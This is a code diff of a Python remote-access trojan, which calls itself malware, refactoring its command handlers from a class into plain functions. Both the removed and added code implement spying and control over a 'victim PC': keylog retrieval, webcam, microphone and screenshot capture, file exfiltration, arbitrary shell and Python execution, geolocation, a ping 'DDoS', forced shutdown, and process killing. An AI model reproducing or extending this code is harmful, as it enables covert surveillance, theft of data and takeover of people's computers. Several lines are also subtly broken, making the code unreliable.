@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 
 # Should we show debug messages or not.
+
 DEBUG = True
 
 try:
@@ -65,11 +66,11 @@ __COMMANDS_FUNCTION = None
 # List of function name and tuple with description and example (Set in initialise_commands()).
 __COMMANDS_HELP = None
 
-# System OK code.
-__SYSTEM_OK = 0
-
 # Server token.
 SERVER_TOKEN = "" # noqa
+
+# System OK code.
+__SYSTEM_OK = 0
 
 # Server group ID.
 SERVER_GROUP = 0
@@ -100,617 +101,6 @@ SPREADING_SKIPPED_DRIVES = ("C", "D")
 
 # Version of the malware.
 VERSION = "[Pre-release] 0.4"
-
-class Commands:
-    # Class Commands that implements commands.
-
-    @staticmethod
-    def command_taskkill(_arguments) -> str:
-        # @function command_taskkill()
-        # @returns str
-        # @description Function for command "taskkill" that kills process.
-
-        # Calling system.
-        _system_result = os.system(f"taskkill /F /IM {_arguments}")
-
-        if _system_result == __SYSTEM_OK:
-            # If result is OK.
-
-            # Returning success.
-            return "Killed task!"
-        else:
-            # If result is not OK.
-
-            # Returning error.
-            return "Unable to kill this task!"
-
-    @staticmethod
-    def command_upload(_arguments, _event) -> str:
-        # @function command_upload()
-        # @returns str
-        # @description Function for command "upload" that uploads file on the victim PC.
-
-        # Not implemented.
-        return "Not implemented yet!"
-
-    @staticmethod
-    def command_properties(_arguments) -> str:
-        # @function command_properties()
-        # @returns str
-        # @description Function for command "properties" that returns properties of the file.
-
-        if os.path.exists(_arguments):
-            # If path exists.
-
-            # Getting size.
-            _property_size = f"{filesystem_get_size(_arguments)}MB"
-
-            # Getting type.
-            _property_type = filesystem_get_type(_arguments) 
-
-            # Getting time properties.
-            _property_created_at = os.path.getctime(_arguments)
-            _property_accessed_at = os.path.getatime(_arguments)
-            _property_modified_at = os.path.getmtime(_arguments)
-
-            # Returning properties.
-            return f"Path: {_arguments},\n" \
-                f"Size: {_property_size},\n" \
-                f"Type: {_property_type},\n" \
-                f"Modified: {_property_modified_at},\n" \
-                f"Created: {_property_created_at},\n" \
-                f"Accessed: {_property_accessed_at}."
-        else:
-            # If path not exists.
-
-            # Error.
-            return "Path does not exists!"
-
-    @staticmethod
-    def command_download(_arguments) -> list:
-        # @function command_download()
-        # @returns str
-        # @description Function for command "download" that downloads files.
-
-        if os.path.exists(_arguments):
-            # If path exists.
-            if os.path.isfile(_arguments):
-                # If this is file.
-
-                if filesystem_get_size(_arguments) < 1536:
-                    # If file is below need size.
-
-                    # Uploading.
-                    return [_arguments, "Download", "doc"] # noqa
-                else:
-                    # If invalid size.
-                    return "Too big file! Maximal size for download: 1536MB(1.5GB)" # noqa
-            elif os.path.isdir(_arguments):
-                # If this is directory.
-
-                if filesystem_get_size(_arguments) < 1536:
-                    # If file is below need size.
-
-                    # Uploading.
-                    return "Directories are not allowed for now!" # noqa
-                else:
-                    # If invalid size.
-                    return "Too big file! Maximal size for download: 1536MB(1.5GB)" # noqa
-        else:
-            # If path not exists.
-
-            # Error.
-            return "Path does not exists" # noqa
-
-    @staticmethod
-    def command_ddos(_arguments) -> str:
-        # @function command_ddos()
-        # @returns str
-        # @description Function for command "ddos" that starts ddos.
-
-        # Getting arguments.
-        _arguments = _arguments.split(";")
-
-        if len(_arguments) >= 1:
-            # If arguments OK.
-
-            if len(_arguments) > 2 and _arguments[2] == "admin":
-                # If admin.
-
-                # Pinging from admin.
-                os.system(f"ping -c {_arguments[0]} {_arguments[1]}")
-
-                # Message.
-                return "Completed DDoS (Admin)"
-
-            # Pinging from user.
-            os.system(f"ping {_arguments[0]}")
-
-            # Message.
-            return "Completed DDoS (User)"
-        else:
-            # Message.
-            return "Incorrect arguments! Example: address;time;admin"
-
-    @staticmethod
-    def command_ls(_arguments) -> str:
-        # @function command_ls()
-        # @returns str
-        # @description Function for command "str" that lists all files in  directory.
-
-        # Globalising current directory.
-        global __CURDIR
-
-        # Returning.
-        return ", ".join(os.listdir(_arguments if _arguments != "" else __CURDIR))
-
-    @staticmethod
-    def command_cd(_arguments) -> str:
-        # @function command_cd()
-        # @returns str
-        # @description Function for command "cd" that changes directory.
-
-        # Globalising current directory.
-        global __CURDIR
-
-        if os.path.exists(__CURDIR + "\\" + _arguments):
-            # If this is local folder.
-
-            # Changing.
-            __CURDIR += _arguments
-
-            # Message.
-            return f"Changed directory to {__CURDIR}"
-        else:
-            # If not local path.
-            if os.path.exists(_arguments):
-                # If path exists - moving there.
-
-                # Changing.
-                __CURDIR = _arguments
-
-                # Message.
-                return f"Changed directory to {__CURDIR}"
-            else:
-                # If invalid directory.
-
-                # Message.
-                return f"Directory {_arguments} does not exists!"
-
-    @staticmethod
-    def command_location(_arguments) -> str:
-        # @function command_location()
-        # @returns str
-        # @description Function for command "location" that returns location of the PC.
-
-        # Getting ip data.
-        _ip = get_ip()
-
-        if "ip" in _ip and "city" in _ip and "country" in _ip and "region" in _ip and "org" in _ip:
-            # If correct fields.
-
-            # Getting ip data.
-            _ipaddress = _ip["ip"] # noqa
-            _ipcity = _ip["city"] # noqa
-            _ipcountry = _ip["country"] # noqa
-            _ipregion = _ip["region"] # noqa
-            _ipprovider = _ip["org"] # noqa
-
-            # Returning.
-            return f"IP: {_ipaddress}," \
-                f"\nCountry: {_ipcountry}," \
-                f"\nRegion: {_ipregion}," \
-                f"\nCity: {_ipcity}," \
-                f"\nProvider: {_ipprovider}."
-        else:
-            # If not valid fields.
-
-            # Returning error.
-            return "Couldn't get location"
-
-    @staticmethod
-    def command_microphone(_arguments) -> list:
-        # @function command_microphone()
-        # @returns str
-        # @description Function for command "microphone" that returns voice message with the microphone.
-
-        try:
-            # Trying to import modules.
-
-            # Importing.
-            import pyaudio
-            import wave
-        except ImportError:
-            # If there is import error.
-
-            # Not supported.
-            return "This command does not supported on selected PC! (pyaduio/wave module is not installed)"  # noqa
-
-        # Getting path.
-        _path = __FOLDER + "Microphone.wav"
-
-        # Recording.
-        record_microphone(_path, _arguments)
-
-        # Message with uploading.
-        return [_path, "Microphone", "audio_message"]
-
-    @staticmethod
-    def command_help(_arguments) -> str:
-        # @function command_help()
-        # @returns str
-        # @description Function for command "help" that returns list of all commands.
-
-        # Returning.
-        return str(__COMMANDS_HELP) # noqa
-
-    @staticmethod
-    def command_tags_new(_arguments) -> str:
-        # @function command_tags_new()
-        # @returns str
-        # @description Function for command "tags_new" that replaces tags.
-
-        # Globalising tags
-        global __TAGS
-
-        # Clearing tags list.
-        __TAGS = []
-
-        # Getting arguments.
-        _arguments = _arguments.split(";")
-
-        if len(_arguments) == 0:
-            # If no arguments.
-
-            # Message.
-            return "Incorrect arguments! Example: (tags separated by ;)"
-
-        # Tags that was added.
-        _new_tags = []
-
-        for _tag in _arguments:
-            # For tags in arguments.
-
-            # Getting clean tag.
-            _clean_tag = _tag.replace(" ", "-")
-
-            # Adding it.
-            _new_tags.append(_clean_tag)
-
-        if len(_new_tags) != 0:
-            # If tags was added.
-
-            # Replacing tags.
-            __TAGS = []
-
-            # Adding new tags
-            __TAGS.extend(_new_tags)
-
-            # Saving tags.
-            save_tags()
-
-            # Message.
-            return f"Added new tags: {_new_tags}"
-        else:
-            # Message.
-            return "Replacing was not completed! No tags passed!"
-
-    @staticmethod
-    def command_tags_add(_arguments: str) -> str:
-        # @function command_tags_add()
-        # @returns str
-        # @description Function for command "tags_add" that add tags.
-
-        # Getting arguments.
-        _arguments = _arguments.split(";")
-
-        if len(_arguments) == 0:
-            # If no arguments.
-
-            # Message.
-            return "Incorrect arguments! Example: (tags separated by ;)"
-
-        # Globalising tags.
-        global __TAGS
-
-        # Tags that was added.
-        _new_tags = []
-
-        for _tag in _arguments:
-            # For tags in arguments.
-
-            # Getting clean tag.
-            _clean_tag = _tag.replace(" ", "-")
-
-            # Adding it.
-            __TAGS.append(_clean_tag)
-            _new_tags.append(_clean_tag)
-
-        # Saving tags.
-        save_tags()
-
-        # Message.
-        return f"Added new tags: {_new_tags}"
-
-    @staticmethod
-    def command_message(_arguments: str) -> str:
-        # @function command_message()
-        # @returns str
-        # @description Function for command "message" that shows message.
-
-        try:
-            # Trying to import module.
-
-            # Importing module.
-            import ctypes
-        except ImportError:
-            # If there is import error.
-
-            # Not supported.
-            return "This command does not supported on selected PC! (ctypes module is not installed)"  # noqa
-
-        # Getting arguments.
-        _arguments = _arguments.split(";")
-
-        # Passing arguments.
-        if len(_arguments) == 0:
-            # If there is no arguments.
-
-            # Message
-            return "Incorrect arguments! Example: text;title;data"
-
-        if len(_arguments) == 1:
-            # If there is only text.
-
-            # Adding title.
-            _arguments.append("")
-
-        if len(_arguments) == 2:
-            # If there is only text and title.
-
-            # Adding title.
-            _arguments.append(0x00000010) # noqa
-
-        # Calling message.
-        try:
-            # Trying to show message.
-
-            # Showing.
-            ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], _arguments[2])
-        except Exception as _exception: # noqa
-            # If there is error.
-
-            # Message.
-            return f"Error when showing message! Error: {_exception}"
-
-        # Message.
-        return "Message was closed!"
-
-    @staticmethod
-    def command_webcam(_arguments) -> list:
-        # @function command_webcam()
-        # @returns list
-        # @description Function for command "webcam" that returns webcam photo.
-
-        try:
-            # Trying to import opencv-python.
-
-            # Importing.
-            import cv2
-        except ImportError:
-            # If there is import error.
-
-            # Not supported.
-            return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)" # noqa
-
-        # Globalising folder.
-        global __FOLDER
-
-        # Getting camera.
-        _camera = cv2.VideoCapture(0)
-
-        # Getting image.
-        _, _image = _camera.read()
-
-        # Getting path.
-        _path = __FOLDER + "webcam.png"
-
-        # Building path.
-        filesystem_build_path(_path)
-
-        # Writing file.
-        cv2.imwrite(_path, _image)
-
-        # Deleting camera.
-        del _camera
-
-        # Returning uploading.
-        return [_path, "Webcam", "photo"]
-
-    @staticmethod
-    def command_screenshot(_arguments) -> list:
-        # @function command_screenshot()
-        # @returns list
-        # @description Function for command "screenshot" that returns screenshot.
-
-        try:
-            # Trying to import.
-
-            # Importing.
-            import PIL.ImageGrab
-        except ImportError:
-            # If there is import error.
-
-            # Not supported.
-            return "This command does not supported on selected PC! (Pillow module is not installed)" # noqa
-
-        # Taking screenshot.
-        screenshot = PIL.ImageGrab.grab()
-
-        # Getting path.
-        _path = __FOLDER + "Screenshot.jpg"
-
-        # Saving it.
-        screenshot.save(_path)
-
-        # Message with uploading.
-        return [_path, "Screenshot", "photo"]
-
-    @staticmethod
-    def command_python(_arguments) -> str:
-        # @function command_python()
-        # @returns str
-        # @description Function for command "python" that executes python code.
-
-        # Executing.
-        return execute_python(_arguments, globals(), locals())
-
-    @staticmethod
-    def command_tags(_arguments) -> str:
-        # @function command_tags()
-        # @returns str
-        # @description Function for command "tags" that returns all tags.
-
-        # Globalising tags.
-        global __TAGS
-
-        # Returning.
-        return str(", ".join(__TAGS))
-
-    @staticmethod
-    def command_version(_arguments) -> str:
-        # @function command_version()
-        # @returns str
-        # @description Function for command "version" that returns current version.
-
-        # Returning.
-        return VERSION
-
-    @staticmethod
-    def command_name_new(_arguments) -> str:
-        # @function command_name_new()
-        # @returns str
-        # @description Function for command "name_new" that changes name to other.
-
-        # Global name.
-        global __NAME
-
-        if type(_arguments) == str and len(_arguments) > 0:
-            # If correct arguments.
-
-            # Changing name.
-            __NAME = _arguments
-
-            # Saving name
-            save_name()
-            # Returning.
-            return f"Name changed to {__NAME}"
-        else:
-            # If name is not valid.
-
-            # Returning.
-            return f"Invalid name!"
-
-    @staticmethod
-    def command_exit(_arguments) -> str:
-        # @function command_exit()
-        # @returns str
-        # @description Function for command "exit" that exits malware.
-
-        # Exiting.
-        raise SystemExit
-
-    @staticmethod
-    def command_shutdown(_arguments) -> str:
-        # @function command_shutdown()
-        # @returns str
-        # @description Function for command "shutdown" that shutdowns PC.
-
-        # Shutdown.
-        os.system("shutdown /s /t 0")
-
-        # Message.
-        return "System was shutdown..."
-
-    @staticmethod
-    def command_restart(_arguments) -> str:
-        # @function command_restart()
-        # @returns str
-        # @description Function for command "restart" that restarts PC.
-
-        # Restarting.
-        os.system("shutdown /r /t 0")
-
-        # Message.
-        return "System was restarted..."
-
-    @staticmethod
-    def command_console(_arguments) -> str:
-        # @function command_console()
-        # @returns str
-        # @description Function for command "console" that executes console command.
-
-        # Executing system and returning result.
-        return str(os.system(_arguments))
-
-    @staticmethod
-    def command_destruct(_arguments) -> str:
-        # @function command_destruct()
-        # @returns str
-        # @description Function for command "destruct" that destroys self from the system.
-
-        # Unregistering from the autorun.
-        autorun_register()
-
-        # Exiting.
-        return command_exit(_arguments)
-
-    @staticmethod
-    def command_keylog(_arguments) -> str:
-        # @function command_keylog()
-        # @returns str
-        # @description Function for command "keylog" that returns keylog string.
-
-        # Globalise keylog.
-        global __KEYLOG
-
-        # Returning.
-        return __KEYLOG
-
-    @staticmethod
-    def command_link(_arguments) -> str:
-        # @function command_link()
-        # @returns str
-        # @description Function for command "link" that opens link in the browser.
-
-        try:
-            # Trying to open with the module.
-
-            # Importing module.
-            import webbrowser
-
-            # Opening link.
-            webbrowser.open(_arguments)
-
-            # Message.
-            return "Link was opened (Via module)!"
-        except ImportError:
-            # If there is ImportError.
-
-            # Opening with system.
-            os.system("open {_arguments}")
-
-            # Message.
-            return "Link was opened (Via system)!"
-
-    @staticmethod
-    def command_drives(_arguments: str) -> str:
-        # @function command_drives()
-        # @returns None
-        # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).
-
-        # Returning.
-        return ", ".join(filesystem_get_drives_list())
 
 
 def filesystem_get_size(_path: str) -> int:
@@ -777,6 +167,612 @@ def filesystem_get_type(_path: str) -> str:
 
     # Returning unknown type if not returned any above.
     return "Unknown"
+
+
+def command_taskkill(_arguments) -> str:
+    # @function command_taskkill()
+    # @returns str
+    # @description Function for command "taskkill" that kills process.
+
+    # Calling system.
+    _system_result = os.system(f"taskkill /F /IM {_arguments}")
+
+    if _system_result == __SYSTEM_OK:
+        # If result is OK.
+
+        # Returning success.
+        return "Killed task!"
+    else:
+        # If result is not OK.
+
+        # Returning error.
+        return "Unable to kill this task!"
+        
+def command_upload(_arguments, _event) -> str:
+    # @function command_upload()
+    # @returns str
+    # @description Function for command "upload" that uploads file on the victim PC.
+
+    return "_event.message!"
+
+
+def command_properties(_arguments) -> str:
+    # @function command_properties()
+    # @returns str
+    # @description Function for command "properties" that returns properties of the file.
+
+    if os.path.exists(_arguments):
+        # If path exists.
+
+        # Getting size.
+        _property_size = f"{filesystem_get_size(_arguments)}MB"
+
+        # Getting type.
+        _property_type = filesystem_get_type(_arguments) 
+
+        # Getting time properties.
+        _property_created_at = os.path.getctime(_arguments)
+        _property_accessed_at = os.path.getatime(_arguments)
+        _property_modified_at = os.path.getmtime(_arguments)
+
+        # Returning properties.
+        return f"Path: {_arguments},\n" \
+               f"Size: {_property_size},\n" \
+               f"Type: {_property_type},\n" \
+               f"Modified: {_property_modified_at},\n" \
+               f"Created: {_property_created_at},\n" \
+               f"Accessed: {_property_accessed_at}."
+    else:
+        # If path not exists.
+
+        # Error.
+        return "Path does not exists!"
+
+
+def command_download(_arguments) -> list:
+    # @function command_download()
+    # @returns str
+    # @description Function for command "download" that downloads files.
+
+    if os.path.exists(_arguments):
+        # If path exists.
+        if os.path.isfile(_arguments):
+            # If this is file.
+
+            if filesystem_get_size(_arguments) < 1536:
+                # If file is below need size.
+
+                # Uploading.
+                return [_arguments, "Download", "doc"] # noqa
+            else:
+                # If invalid size.
+                return "Too big file! Maximal size for download: 1536MB(1.5GB)" # noqa
+        elif os.path.isdir(_arguments):
+            # If this is directory.
+
+            if filesystem_get_size(_arguments) < 1536:
+                # If file is below need size.
+
+                # Uploading.
+                return "Directories are not allowed for now!" # noqa
+            else:
+                # If invalid size.
+                return "Too big file! Maximal size for download: 1536MB(1.5GB)" # noqa
+    else:
+        # If path not exists.
+
+        # Error.
+        return "Path does not exists" # noqa
+
+
+def command_ddos(_arguments) -> str:
+    # @function command_ddos()
+    # @returns str
+    # @description Function for command "ddos" that starts ddos.
+
+    # Getting arguments.
+    _arguments = _arguments.split(";")
+
+    if len(_arguments) >= 1:
+        # If arguments OK.
+
+        if len(_arguments) > 2 and _arguments[2] == "admin":
+            # If admin.
+
+            # Pinging from admin.
+            os.system(f"ping -c {_arguments[0]} {_arguments[1]}")
+
+            # Message.
+            return "Completed DDoS (Admin)"
+
+        # Pinging from user.
+        os.system(f"ping {_arguments[0]}")
+
+        # Message.
+        return "Completed DDoS (User)"
+    else:
+        # Message.
+        return "Incorrect arguments! Example: address;time;admin"
+
+
+def command_ls(_arguments) -> str:
+    # @function command_ls()
+    # @returns str
+    # @description Function for command "str" that lists all files in  directory.
+
+    # Globalising current directory.
+    global __CURDIR
+
+    # Returning.
+    return ", ".join(os.listdir(_arguments if _arguments != "" else __CURDIR))
+
+
+def command_cd(_arguments) -> str:
+    # @function command_cd()
+    # @returns str
+    # @description Function for command "cd" that changes directory.
+
+    # Globalising current directory.
+    global __CURDIR
+
+    if os.path.exists(__CURDIR + "\\" + _arguments):
+        # If this is local folder.
+
+        # Changing.
+        __CURDIR += _arguments
+
+        # Message.
+        return f"Changed directory to {__CURDIR}"
+    else:
+        # If not local path.
+        if os.path.exists(_arguments):
+            # If path exists - moving there.
+
+            # Changing.
+            __CURDIR = _arguments
+
+            # Message.
+            return f"Changed directory to {__CURDIR}"
+        else:
+            # If invalid directory.
+
+            # Message.
+            return f"Directory {_arguments} does not exists!"
+
+
+def command_location(_arguments) -> str:
+    # @function command_location()
+    # @returns str
+    # @description Function for command "location" that returns location of the PC.
+
+    # Getting ip data.
+    _ip = get_ip()
+
+    if "ip" in _ip and "city" in _ip and "country" in _ip and "region" in _ip and "org" in _ip:
+        # If correct fields.
+
+        # Getting ip data.
+        _ipaddress = _ip["ip"] # noqa
+        _ipcity = _ip["city"] # noqa
+        _ipcountry = _ip["country"] # noqa
+        _ipregion = _ip["region"] # noqa
+        _ipprovider = _ip["org"] # noqa
+
+        # Returning.
+        return f"IP: {_ipaddress}," \
+               f"\nCountry: {_ipcountry}," \
+               f"\nRegion: {_ipregion}," \
+               f"\nCity: {_ipcity}," \
+               f"\nProvider: {_ipprovider}."
+    else:
+        # If not valid fields.
+
+        # Returning error.
+        return "Couldn't get location"
+
+
+def command_microphone(_arguments) -> list:
+    # @function command_microphone()
+    # @returns str
+    # @description Function for command "microphone" that returns voice message with the microphone.
+
+    try:
+        # Trying to import modules.
+
+        # Importing.
+        import pyaudio
+        import wave
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return "This command does not supported on selected PC! (pyaduio/wave module is not installed)"  # noqa
+
+    # Getting path.
+    _path = __FOLDER + "Microphone.wav"
+
+    # Recording.
+    record_microphone(_path, _arguments)
+
+    # Message with uploading.
+    return [_path, "Microphone", "audio_message"]
+
+
+def command_help(_arguments) -> str:
+    # @function command_help()
+    # @returns str
+    # @description Function for command "help" that returns list of all commands.
+
+    # Returning.
+    return str(__COMMANDS_HELP) # noqa
+
+
+def command_tags_new(_arguments) -> str:
+    # @function command_tags_new()
+    # @returns str
+    # @description Function for command "tags_new" that replaces tags.
+
+    # Globalising tags
+    global __TAGS
+
+    # Clearing tags list.
+    __TAGS = []
+
+    # Getting arguments.
+    _arguments = _arguments.split(";")
+
+    if len(_arguments) == 0:
+        # If no arguments.
+
+        # Message.
+        return "Incorrect arguments! Example: (tags separated by ;)"
+
+    # Tags that was added.
+    _new_tags = []
+
+    for _tag in _arguments:
+        # For tags in arguments.
+
+        # Getting clean tag.
+        _clean_tag = _tag.replace(" ", "-")
+
+        # Adding it.
+        _new_tags.append(_clean_tag)
+
+    if len(_new_tags) != 0:
+        # If tags was added.
+
+        # Replacing tags.
+        __TAGS = []
+
+        # Adding new tags
+        __TAGS.extend(_new_tags)
+
+        # Saving tags.
+        save_tags()
+
+        # Message.
+        return f"Added new tags: {_new_tags}"
+    else:
+        # Message.
+        return "Replacing was not completed! No tags passed!"
+
+
+def command_tags_add(_arguments: str) -> str:
+    # @function command_tags_add()
+    # @returns str
+    # @description Function for command "tags_add" that add tags.
+
+    # Getting arguments.
+    _arguments = _arguments.split(";")
+
+    if len(_arguments) == 0:
+        # If no arguments.
+
+        # Message.
+        return "Incorrect arguments! Example: (tags separated by ;)"
+
+    # Globalising tags.
+    global __TAGS
+
+    # Tags that was added.
+    _new_tags = []
+
+    for _tag in _arguments:
+        # For tags in arguments.
+
+        # Getting clean tag.
+        _clean_tag = _tag.replace(" ", "-")
+
+        # Adding it.
+        __TAGS.append(_clean_tag)
+        _new_tags.append(_clean_tag)
+
+    # Saving tags.
+    save_tags()
+
+    # Message.
+    return f"Added new tags: {_new_tags}"
+
+
+def command_message(_arguments: str) -> str:
+    # @function command_message()
+    # @returns str
+    # @description Function for command "message" that shows message.
+
+    try:
+        # Trying to import module.
+
+        # Importing module.
+        import ctypes
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return "This command does not supported on selected PC! (ctypes module is not installed)"  # noqa
+
+    # Getting arguments.
+    _arguments = _arguments.split(";")
+
+    # Passing arguments.
+    if len(_arguments) == 0:
+        # If there is no arguments.
+
+        # Message
+        return "Incorrect arguments! Example: text;title;data"
+
+    if len(_arguments) == 1:
+        # If there is only text.
+
+        # Adding title.
+        _arguments.append("")
+
+    if len(_arguments) == 2:
+        # If there is only text and title.
+
+        # Adding title.
+        _arguments.append(0x00000010) # noqa
+
+    # Calling message.
+    try:
+        # Trying to show message.
+
+        # Showing.
+        ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], _arguments[2])
+    except Exception as _exception: # noqa
+        # If there is error.
+
+        # Message.
+        return f"Error when showing message! Error: {_exception}"
+
+    # Message.
+    return "Message was closed!"
+
+
+def command_webcam(_arguments) -> list:
+    # @function command_webcam()
+    # @returns list
+    # @description Function for command "webcam" that returns webcam photo.
+
+    try:
+        # Trying to import opencv-python.
+
+        # Importing.
+        import cv2
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)" # noqa
+
+    # Globalising folder.
+    global __FOLDER
+
+    # Getting camera.
+    _camera = cv2.VideoCapture(0)
+
+    # Getting image.
+    _, _image = _camera.read()
+
+    # Getting path.
+    _path = __FOLDER + "webcam.png"
+
+    # Building path.
+    filesystem_build_path(_path)
+
+    # Writing file.
+    cv2.imwrite(_path, _image)
+
+    # Deleting camera.
+    del _camera
+
+    # Returning uploading.
+    return [_path, "Webcam", "photo"]
+
+
+def command_screenshot(_arguments) -> list:
+    # @function command_screenshot()
+    # @returns list
+    # @description Function for command "screenshot" that returns screenshot.
+
+    try:
+        # Trying to import.
+
+        # Importing.
+        import PIL.ImageGrab
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return "This command does not supported on selected PC! (Pillow module is not installed)" # noqa
+
+    # Taking screenshot.
+    screenshot = PIL.ImageGrab.grab()
+
+    # Getting path.
+    _path = __FOLDER + "Screenshot.jpg"
+
+    # Saving it.
+    screenshot.save(_path)
+
+    # Message with uploading.
+    return [_path, "Screenshot", "photo"]
+
+
+def command_python(_arguments) -> str:
+    # @function command_python()
+    # @returns str
+    # @description Function for command "python" that executes python code.
+
+    # Executing.
+    return execute_python(_arguments, globals(), locals())
+
+
+def command_tags(_arguments) -> str:
+    # @function command_tags()
+    # @returns str
+    # @description Function for command "tags" that returns all tags.
+
+    # Globalising tags.
+    global __TAGS
+
+    # Returning.
+    return str(", ".join(__TAGS))
+
+
+def command_version(_arguments) -> str:
+    # @function command_version()
+    # @returns str
+    # @description Function for command "version" that returns current version.
+
+    # Returning.
+    return VERSION
+
+
+def command_name_new(_arguments) -> str:
+    # @function command_name_new()
+    # @returns str
+    # @description Function for command "name_new" that changes name to other.
+
+    # Global name.
+    global __NAME
+
+    if type(_arguments) == str and len(_arguments) > 0:
+        # If correct arguments.
+
+        # Changing name.
+        __NAME = _arguments
+
+        # Saving name
+        save_name()
+        # Returning.
+        return f"Name changed to {__NAME}"
+    else:
+        # If name is not valid.
+
+        # Returning.
+        return f"Invalid name!"
+
+
+def command_exit(_arguments) -> str:
+    # @function command_exit()
+    # @returns str
+    # @description Function for command "exit" that exits malware.
+
+    # Exiting.
+    raise SystemExit
+
+
+def command_shutdown(_arguments) -> str:
+    # @function command_shutdown()
+    # @returns str
+    # @description Function for command "shutdown" that shutdowns PC.
+
+    # Shutdown.
+    os.system("shutdown /s /t 0")
+
+    # Message.
+    return "System was shutdown..."
+
+
+def command_restart(_arguments) -> str:
+    # @function command_restart()
+    # @returns str
+    # @description Function for command "restart" that restarts PC.
+
+    # Restarting.
+    os.system("shutdown /r /t 0")
+
+    # Message.
+    return "System was restarted..."
+
+
+def command_console(_arguments) -> str:
+    # @function command_console()
+    # @returns str
+    # @description Function for command "console" that executes console command.
+
+    # Executing system and returning result.
+    return str(os.system(_arguments))
+
+
+def command_destruct(_arguments) -> str:
+    # @function command_destruct()
+    # @returns str
+    # @description Function for command "destruct" that destroys self from the system.
+
+    # Unregistering from the autorun.
+    autorun_register()
+
+    # Exiting.
+    return command_exit(_arguments)
+
+
+def command_keylog(_arguments) -> str:
+    # @function command_keylog()
+    # @returns str
+    # @description Function for command "keylog" that returns keylog string.
+
+    # Globalise keylog.
+    global __KEYLOG
+
+    # Returning.
+    return __KEYLOG
+
+
+def command_link(_arguments) -> str:
+    # @function command_link()
+    # @returns str
+    # @description Function for command "link" that opens link in the browser.
+
+    try:
+        # Trying to open with the module.
+
+        # Importing module.
+        import webbrowser
+
+        # Opening link.
+        webbrowser.open(_arguments)
+
+        # Message.
+        return "Link was opened (Via module)!"
+    except ImportError:
+        # If there is ImportError.
+
+        # Opening with system.
+        os.system("open {_arguments}")
+
+        # Message.
+        return "Link was opened (Via system)!"
+
+
+def command_drives(_arguments: str) -> str:
+    # @function command_drives()
+    # @returns None
+    # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).
+
+    # Returning.
+    return ", ".join(filesystem_get_drives_list())
 
 
 def executable_get_extension() -> str:
@@ -1124,37 +1120,38 @@ def initialise_commands() -> None:
     # @description Function that initialises commands.
 
     # Globalising command functions and help.
+
     global __COMMANDS_FUNCTION
     global __COMMANDS_HELP
 
     # Commands function.
     __COMMANDS_FUNCTION = {
-        "screenshot": Commands.screenshot,
-        "webcam": Commands.webcam,
-        "microphone": Commands.microphone,
-        "help": Commands.help,
-        "version": Commands.version,
-        "tags": Commands.tags,
-        "location": Commands.location,
-        "keylog": Commands.keylog,
-        "cd": Commands.cd,
-        "ls": Commands.ls,
-        "drives": Commands.drives,
-        "tags_new": Commands.tags_new,
-        "tags_add": Commands.tags_add,
-        "shutdown": Commands.shutdown,
-        "restart": Commands.restart,
-        "console": Commands.console,
-        "upload": Commands.upload,
-        "ddos": Commands.ddos,
-        "link": Commands.link,
-        "name_new": Commands.name_new,
-        "exit": Commands.exit,
-        "python": Commands.python,
-        "message": Commands.message,
-        "destruct": Commands.destruct,
-        "download": Commands.download,
-        "properties": Commands.properties
+        "screenshot": command_screenshot,
+        "webcam": command_webcam,
+        "microphone": command_microphone,
+        "help": command_help,
+        "version": command_version,
+        "tags": command_tags,
+        "location": command_location,
+        "keylog": command_keylog,
+        "cd": command_cd,
+        "ls": command_ls,
+        "drives": command_drives,
+        "tags_new": command_tags_new,
+        "tags_add": command_tags_add,
+        "shutdown": command_shutdown,
+        "restart": command_restart,
+        "console": command_console,
+        "upload": command_upload,
+        "ddos": command_ddos,
+        "link": command_link,
+        "name_new": command_name_new,
+        "exit": command_exit,
+        "python": command_python,
+        "message": command_message,
+        "destruct": command_destruct,
+        "download": command_download,
+        "properties": command_properties
     }
 
     __COMMANDS_HELP = {
